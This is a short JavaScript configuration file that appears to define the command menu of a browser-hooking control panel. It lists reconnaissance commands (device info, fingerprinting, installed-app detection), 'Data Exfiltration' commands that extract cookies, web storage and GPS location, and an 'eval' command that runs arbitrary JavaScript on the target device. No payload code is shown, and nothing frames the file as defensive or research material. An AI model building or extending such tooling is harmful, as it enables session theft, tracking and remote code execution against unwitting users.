export const commandTemplates = [
  {
    category: "Reconnaissance",
    icon: "InfoFilled",
    commands: [
      { name: "System Info", command: "system.info", description: "Get device info, screen, battery, GPU, media devices" },
      { name: "Browser Fingerprint", command: "fingerprint", description: "Get canvas fingerprint hash" },
      { name: "Detect Apps", command: "apps", description: "Detect installed apps via URL schemes" },
      { name: "Network Timing", command: "network", description: "Get page load performance timing" }
    ]
  },
  {
    category: "Data Exfiltration",
    icon: "Key",
    commands: [
      { name: "Cookies", command: "cookies", description: "Extract browser cookies" },
      { name: "Web Storage", command: "storage", description: "Extract localStorage and sessionStorage" },
      { name: "Geolocation", command: "location", description: "Get device GPS coordinates" }
    ]
  },
  {
    category: "Custom Execution",
    icon: "Edit",
    commands: [
      { name: "Execute JavaScript", command: "eval ", description: "Execute custom JavaScript code on device" }
    ]
  }
]
